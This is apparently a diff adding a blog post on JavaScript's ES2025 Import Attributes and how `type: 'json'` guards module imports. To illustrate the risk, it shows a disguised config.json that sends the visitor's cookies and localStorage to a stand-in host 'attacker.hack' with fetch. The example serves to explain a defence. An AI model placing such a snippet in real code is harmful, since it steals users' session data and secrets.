@@ -1,0 +1,123 @@
+---
+title: "What's new in JavaScript ES2025: Import Attributes"
+description: A new way to make module imports more secure.
+date: 2024-11-22T21:33:25.684Z
+update: 2025-01-22T21:13:59.142Z
+image:
+  src: /media/2024/11/js-es2025.svg
+  alt: JavaScript ES2025
+  og: /media/2024/11/js-es2025.png
+tags:
+  - Programación
+  - JavaScript
+  - ES2025
+  - JSON
+sources:
+  - title: JavaScript Import Attributes (ES2025) - Trevor I. Lasn
+    href: https://www.trevorlasn.com/blog/import-attributes-in-javascript
+  - title: Import Attributes - TC39
+    href: https://tc39.es/proposal-import-attributes/
+  - title: Import Attributes - TC39 (GitHub)
+    href: https://github.com/tc39/proposal-import-attributes
+---
+import { BaselineStatus } from '@astro-community/astro-embed-baseline-status';
+
+<BaselineStatus id="json-modules" />
+
+JavaScript now includes **Import Attributes**, a feature that lets you explicitly declare what kind of module you're importing. This addition brings enhanced security and clarity to module imports, particularly for JSON and other non-JavaScript modules.
+
+## ❌ The Problem with File Extensions
+
+When importing modules on the web, we can't reliably use file extensions to determine module types. A server might send JavaScript code even when requesting a file with a `.json` extension, potentially creating security risks:
+
+```js title="main.js"
+import config from './config.json';
+```
+
+What you expect to get:
+
+```json title="config.json"
+{
+  "accessToken": "secret-key",
+  "refreshToken": "secret-key",
+  "expiresAt": "2125-01-21T21:35:34.607Z"
+}
+```
+
+What a compromised server could send instead:
+
+```js title="config.json"
+export default (function () {
+  // Send your API keys to an attacker
+  fetch('https://attacker.hack', {
+    method: 'POST',
+    body: JSON.stringify({
+      cookies: document.cookie,
+      localStorage: window.localStorage
+    })
+  });
+
+  // Then return what looks like normal config
+  return {
+    accessToken: 'secret-key',
+    refreshToken: 'secret-key',
+    expiresAt: "2125-01-21T21:35:34.607Z"
+  }
+})();
+```
+
+## 💡 The Solution: Import Attributes
+
+Import Attributes let you explicitly declare what type of module you expect, creating a contract that JavaScript environments must enforce:
+
+```diff title="main.js"
+- // WITHOUT Import Attributes - potentially unsafe
+- import config from './config.json';
++ // WITH Import Attributes - safe JSON import
++ import config from './config.json' with { type: 'json' };
+```
+
+## 💭 Where you can use Import Attributes?
+
+The syntax works consistently across different import scenarios:
+
+```js
+// Regular imports
+import config from './config.json' with { type: 'json' };
+
+// Dynamic imports work too
+const config = await import('./config.json', { 
+  with: { type: 'json' } 
+});
+
+// Re-exports
+export { apiKey } from './config.json' with { type: 'json' };
+
+// Specify JavaScript module
+import module from './module.js' with { type: 'javascript' };
+
+// Web Workers
+new Worker('worker.wasm', {
+  type: 'module',
+  with: { type: "webassembly" }
+});
+```
+
+## 📌 Key Benefits
+
+- **Security**: When importing JSON modules, the `type: "json"` attribute guarantees you'll receive either JSON data or an error - never executable code.
+
+- **Consistency**: Provides a standard way to handle different module types across all JavaScript environments.
+
+- **Extensibility**: While JSON modules are the first use case, the syntax is designed to support future module types and additional metadata attributes.
+
+- **Cache Control**: Hosts can use attributes as part of their module caching strategy, with the behavior defined by each environment.
+
+## Practical Applications
+
+- **JSON Modules**: The core use case of import attributes is to reliably load JSON modules. By specifying `type: "json"` you guarantee that the server delivers data as JSON, not potentially malicious code.
+- **Dynamic Imports**:  Import attributes allow using dynamic imports (`await import()`) and control over module type, making them more flexible for various use cases.
+
+## The Future of Import Attributes
+
+Import attributes are a crucial step towards a safer and more predictable JavaScript ecosystem. They're expected to become part of ES2025 and will likely be essential for web development in the coming years.
